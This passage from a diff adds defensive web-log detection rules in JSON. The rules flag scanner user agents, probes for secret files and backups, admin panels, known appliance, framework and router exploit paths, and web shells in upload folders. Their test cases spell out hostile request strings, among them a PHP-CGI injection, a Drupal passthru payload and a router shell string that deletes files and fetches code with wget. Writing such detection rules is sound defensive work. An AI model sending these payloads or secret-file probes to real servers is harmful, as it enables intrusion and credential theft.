+              "burpcollaborator"
+            ]
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "scanner"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "sqlmap/1.7.2#stable (https://sqlmap.org)",
+            "path": "/",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=1 dec=0 target=/"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:001)",
+            "path": "/",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=1 dec=0 target=/"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Fuzz Faster U Fool v2.1.0 ffuf/2.1.0",
+            "path": "/",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=1 dec=0 target=/"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)",
+            "path": "/",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=1 dec=0 target=/"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=1 dec=0 target=/"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Googlebot/2.1 (+http://www.google.com/bot.html)",
+            "path": "/",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=1 dec=0 target=/"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "curl/8.5.0",
+            "path": "/",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=1 dec=0 target=/"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-recon-secret-file-probe",
+      "name": "Request for a dotfile or secret store path",
+      "description": "A request for /.env, /.git/config, /.aws/credentials, /.ssh/id_rsa, /.npmrc, /.htpasswd or similar. Scanners probe these everywhere; the response status shows whether anything was exposed.",
+      "tactic": "Reconnaissance",
+      "technique": "T1595.002",
+      "technique_name": "Active Scanning: Vulnerability Scanning",
+      "severity": "medium",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "path",
+            "op": "regex",
+            "pattern": "(?:^|/)\\.(?:env(?:\\.[\\w-]{1,20})?|git/(?:config|head|index|logs/head)|svn/(?:entries|wc\\.db)|aws/credentials|npmrc|pypirc|netrc|ssh/(?:id_rsa|id_ed25519|authorized_keys)|docker/config\\.json|kube/config|bash_history|htpasswd|htaccess|DS_Store)$"
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "recon",
+        "secrets"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/.env",
+            "destination": "203.0.113.7",
+            "command": "status=404 bytes=512 len=5 dec=0 target=/.env"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/app/.git/config",
+            "destination": "203.0.113.7",
+            "command": "status=403 bytes=512 len=16 dec=0 target=/app/.git/config"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/.aws/credentials",
+            "destination": "203.0.113.7",
+            "command": "status=404 bytes=512 len=17 dec=0 target=/.aws/credentials"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/.ssh/id_rsa",
+            "destination": "203.0.113.7",
+            "command": "status=404 bytes=512 len=12 dec=0 target=/.ssh/id_rsa"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/environment",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=12 dec=0 target=/environment"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/docs/env-vars",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=14 dec=0 target=/docs/env-vars"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/.well-known/security.txt",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=25 dec=0 target=/.well-known/security.txt"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/git/config-guide",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=17 dec=0 target=/git/config-guide"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-exposure-secret-file-served",
+      "name": "Dotfile or secret store path returned content",
+      "description": "The same paths as web-recon-secret-file-probe, but the server answered 2xx: the file may be publicly readable. Treat as an exposure to verify and rotate, not as proof that secrets leaked.",
+      "tactic": "Credential Access",
+      "technique": "T1552.001",
+      "technique_name": "Unsecured Credentials: Credentials In Files",
+      "severity": "high",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "command",
+            "op": "regex",
+            "pattern": "^status=2\\d\\d\\s"
+          },
+          {
+            "field": "path",
+            "op": "regex",
+            "pattern": "(?:^|/)\\.(?:env(?:\\.[\\w-]{1,20})?|git/(?:config|head|index|logs/head)|svn/(?:entries|wc\\.db)|aws/credentials|npmrc|pypirc|netrc|ssh/(?:id_rsa|id_ed25519|authorized_keys)|docker/config\\.json|kube/config|bash_history|htpasswd)$"
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "exposure",
+        "secrets"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/.env",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=5 dec=0 target=/.env"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/app/.git/config",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=16 dec=0 target=/app/.git/config"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/.aws/credentials",
+            "destination": "203.0.113.7",
+            "command": "status=206 bytes=512 len=17 dec=0 target=/.aws/credentials"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/.env",
+            "destination": "203.0.113.7",
+            "command": "status=404 bytes=512 len=5 dec=0 target=/.env"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/.git/config",
+            "destination": "203.0.113.7",
+            "command": "status=403 bytes=512 len=12 dec=0 target=/.git/config"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/environment",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=12 dec=0 target=/environment"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-recon-backup-config-probe",
+      "name": "Request for a backup, dump or editor copy of a config file",
+      "description": "A request for a name such as wp-config.php.bak, config.old, database.sql, dump.sql, backup.zip or a trailing-tilde copy of a script.",
+      "tactic": "Reconnaissance",
+      "technique": "T1595.002",
+      "technique_name": "Active Scanning: Vulnerability Scanning",
+      "severity": "medium",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "path",
+            "op": "regex",
+            "pattern": "(?:(?:wp-config|config|configuration|settings|database|db|dump|backup|web\\.config)[\\w.-]{0,20}\\.(?:bak|old|orig|save|swp|sql|zip|tar|tgz|gz|7z|rar)|\\.(?:php|asp|aspx|jsp)~)$"
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "recon"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/wp-config.php.bak",
+            "destination": "203.0.113.7",
+            "command": "status=404 bytes=512 len=18 dec=0 target=/wp-config.php.bak"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/backup.zip",
+            "destination": "203.0.113.7",
+            "command": "status=404 bytes=512 len=11 dec=0 target=/backup.zip"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/db_dump.sql",
+            "destination": "203.0.113.7",
+            "command": "status=404 bytes=512 len=12 dec=0 target=/db_dump.sql"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/index.php~",
+            "destination": "203.0.113.7",
+            "command": "status=404 bytes=512 len=11 dec=0 target=/index.php~"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/config",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=7 dec=0 target=/config"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/docs/backup-guide.html",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=23 dec=0 target=/docs/backup-guide.html"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/downloads/dumpster.png",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=23 dec=0 target=/downloads/dumpster.png"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/settings",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=9 dec=0 target=/settings"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-recon-admin-interface-probe",
+      "name": "Request for a management or debug interface",
+      "description": "Requests for phpMyAdmin, Adminer, Tomcat manager, JMX console, Spring actuator env/heapdump, Solr admin, server-status, profiler or debug panels. Expected to be refused on a hardened site.",
+      "tactic": "Reconnaissance",
+      "technique": "T1595.002",
+      "technique_name": "Active Scanning: Vulnerability Scanning",
+      "severity": "low",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "path",
+            "op": "regex",
+            "pattern": "^/(?:phpmyadmin|pma|adminer(?:\\.php)?|manager/html|jmx-console|web-console|solr/admin|actuator/(?:env|heapdump|threaddump|gateway/routes|jolokia)|server-status|server-info|_profiler|telescope|horizon|elmah\\.axd|trace\\.axd)(?:/|$)"
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "recon",
+        "admin"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/phpmyadmin/index.php",
+            "destination": "203.0.113.7",
+            "command": "status=404 bytes=512 len=21 dec=0 target=/phpmyadmin/index.php"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/actuator/heapdump",
+            "destination": "203.0.113.7",
+            "command": "status=401 bytes=512 len=18 dec=0 target=/actuator/heapdump"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/manager/html",
+            "destination": "203.0.113.7",
+            "command": "status=403 bytes=512 len=13 dec=0 target=/manager/html"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/server-status",
+            "destination": "203.0.113.7",
+            "command": "status=403 bytes=512 len=14 dec=0 target=/server-status"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/docs/phpmyadmin-howto",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=22 dec=0 target=/docs/phpmyadmin-howto"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/actuator/health",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=16 dec=0 target=/actuator/health"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/telescopes/buy",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=15 dec=0 target=/telescopes/buy"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/admin/",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=7 dec=0 target=/admin/"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-cve-network-appliance-probe",
+      "name": "Request pattern for a known edge-appliance or enterprise-software exploit",
+      "description": "Paths used by public exploits against F5 BIG-IP (/mgmt/tm/util/bash, /tmui/ with ..;/), Citrix ADC (/vpns/portal/scripts), FortiOS (/remote/fgt_lang), Confluence (setupadministrator, text-inline.vm), vCenter (uploadova), MOVEit (human2.aspx) and Ivanti. Matching a request does not mean the host is vulnerable or compromised.",
+      "tactic": "Initial Access",
+      "technique": "T1190",
+      "technique_name": "Exploit Public-Facing Application",
+      "severity": "high",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "path",
+            "op": "regex",
+            "pattern": "(?:/mgmt/tm/util/bash|/vpns/portal/scripts/|/remote/fgt_lang|/setup/setupadministrator\\.action|/template/aui/text-inline\\.vm|/ui/vropspluginui/rest/services/uploadova|/human2\\.aspx|/api/v1/totp/user-backup-code/|/analytics/telemetry/ph/api/hyper/send)"
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "cve",
+        "appliance"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "POST",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/mgmt/tm/util/bash",
+            "destination": "203.0.113.7",
+            "command": "status=401 bytes=512 len=18 dec=0 target=/mgmt/tm/util/bash"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/vpns/portal/scripts/newbm.pl",
+            "destination": "203.0.113.7",
+            "command": "status=404 bytes=512 len=29 dec=0 target=/vpns/portal/scripts/newbm.pl"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/remote/fgt_lang",
+            "destination": "203.0.113.7",
+            "command": "status=404 bytes=512 len=23 dec=0 target=/remote/fgt_lang?lang=x"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/template/aui/text-inline.vm",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=28 dec=0 target=/template/aui/text-inline.vm"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/mgmt/status",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=12 dec=0 target=/mgmt/status"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/docs/vpns",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=10 dec=0 target=/docs/vpns"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/remote/help",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=12 dec=0 target=/remote/help"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/api/v1/users",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=13 dec=0 target=/api/v1/users"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-cve-framework-probe",
+      "name": "Request pattern for a known web-framework exploit",
+      "description": "Paths and parameters used by public exploits against PHPUnit eval-stdin, Laravel Ignition, ThinkPHP invokefunction, Drupal render arrays (CVE-2018-7600), PHP-CGI argument injection and Exchange autodiscover (ProxyShell).",
+      "tactic": "Initial Access",
+      "technique": "T1190",
+      "technique_name": "Exploit Public-Facing Application",
+      "severity": "high",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "command",
+            "op": "regex",
+            "pattern": "(?:/vendor/phpunit/[\\w/.-]{0,80}eval-stdin\\.php|/_ignition/execute-solution|think\\\\app/invokefunction|\\[#(?:post_render|markup|lazy_builder)\\]|allow_url_include|auto_prepend_file|autodiscover\\.json[^ ]{0,60}@)"
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "cve",
+        "framework"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "POST",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=51 dec=0 target=/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
+          },
+          {
+            "executable": "web:access",
+            "operation": "POST",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/_ignition/execute-solution",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=27 dec=0 target=/_ignition/execute-solution"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=47 dec=0 target=/?q=user/password&name[#post_render][]=passthru"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/index.php",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=66 dec=0 target=/index.php?-d allow_url_include=1 -d auto_prepend_file=php://input"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/vendor/composer/installed.json",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=31 dec=0 target=/vendor/composer/installed.json"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/autodiscover/autodiscover.xml",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=30 dec=0 target=/autodiscover/autodiscover.xml"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/docs/allow-url-include",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=23 dec=0 target=/docs/allow-url-include"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-recon-iot-router-probe",
+      "name": "Request pattern for a consumer router or IoT exploit",
+      "description": "Paths used by botnets against home routers and DVRs (boaform, GponForm, HNAP1, setup.cgi next_file, LuCI stok, busybox shell strings).",
+      "tactic": "Initial Access",
+      "technique": "T1190",
+      "technique_name": "Exploit Public-Facing Application",
+      "severity": "medium",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "command",
+            "op": "regex",
+            "pattern": "(?:/boaform/admin/formlogin|/gponform/diag_form|/hnap1/?(?:\\s|$)|/setup\\.cgi\\?next_file=|/cgi-bin/luci/;stok=|/cgi-bin/mainfunction\\.cgi|/shell\\?cd\\+?/tmp)"
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "iot",
+        "botnet"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "POST",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/boaform/admin/formLogin",
+            "destination": "203.0.113.7",
+            "command": "status=404 bytes=512 len=24 dec=0 target=/boaform/admin/formLogin"
+          },
+          {
+            "executable": "web:access",
+            "operation": "POST",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/GponForm/diag_Form",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=27 dec=0 target=/GponForm/diag_Form?images/"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/HNAP1/",
+            "destination": "203.0.113.7",
+            "command": "status=404 bytes=512 len=7 dec=0 target=/HNAP1/"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/shell",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=39 dec=0 target=/shell?cd+/tmp;rm+-rf+*;wget+http://x/a"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/docs/hnap",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=10 dec=0 target=/docs/hnap"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/cgi-bin/luci/admin/status",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=26 dec=0 target=/cgi-bin/luci/admin/status"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/setup.html",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=11 dec=0 target=/setup.html"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-webshell-script-in-upload-dir",
+      "name": "Script file served from an upload or static directory",
+      "description": "A server-side script extension (php, jsp, aspx, ...) requested under /uploads, /images, /files, /media or similar and answered 2xx: uploaded content that executes is the typical web shell footprint.",
+      "tactic": "Persistence",
+      "technique": "T1505.003",
+      "technique_name": "Server Software Component: Web Shell",
+      "severity": "high",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "command",
+            "op": "regex",
+            "pattern": "^status=2\\d\\d\\s"
+          },
+          {
+            "field": "path",
+            "op": "regex",
+            "pattern": "/(?:uploads?|images?|img|files|media|assets|static|tmp|userfiles|wp-content/uploads)/[^?]{0,200}\\.(?:php[3-8s]?|phtml|phar|jsp[xf]?|aspx?|ashx|cfm|war)$"
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "webshell"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/wp-content/uploads/2026/01/x.php",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=33 dec=0 target=/wp-content/uploads/2026/01/x.php"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/uploads/avatar.php5",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=27 dec=0 target=/uploads/avatar.php5?cmd=id"
+          },
+          {
+            "executable": "web:access",
+            "operation": "POST",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/files/tmp/a.jsp",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=16 dec=0 target=/files/tmp/a.jsp"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/uploads/photo.jpg",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=18 dec=0 target=/uploads/photo.jpg"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/wp-content/uploads/a.php",
+            "destination": "203.0.113.7",
+            "command": "status=404 bytes=512 len=25 dec=0 target=/wp-content/uploads/a.php"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/app/index.php",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=14 dec=0 target=/app/index.php"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-webshell-known-name",
